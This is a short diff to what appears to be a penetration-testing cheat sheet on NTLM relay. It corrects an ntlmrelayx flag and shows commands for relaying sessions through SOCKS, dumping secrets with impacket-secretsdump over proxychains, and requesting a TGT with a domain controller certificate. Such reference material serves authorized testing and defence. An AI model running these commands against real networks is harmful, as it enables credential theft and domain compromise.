@@ -183,7 +183,7 @@ gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass '' CORP.LOCAL/DC01\$ dc01.ccache
 **What/why:** Instead of a single scripted action, `ntlmrelayx -socks` keeps relayed sessions alive as SOCKS proxies so an operator can interactively drive tools (`secretsdump.py`, `smbclient.py`, `impacket-mssqlclient`, etc.) through the relayed authentication.
 
 ```bash
-ntlmrelayx.py -socks -smb2support -t TARGETS.txt
+ntlmrelayx.py -socks -smb2support -tf TARGETS.txt
 # then, in a second terminal, once a session appears:
 proxychains impacket-secretsdump -no-pass 'CORP.LOCAL/TARGETPC$'@TARGET_IP
 ```
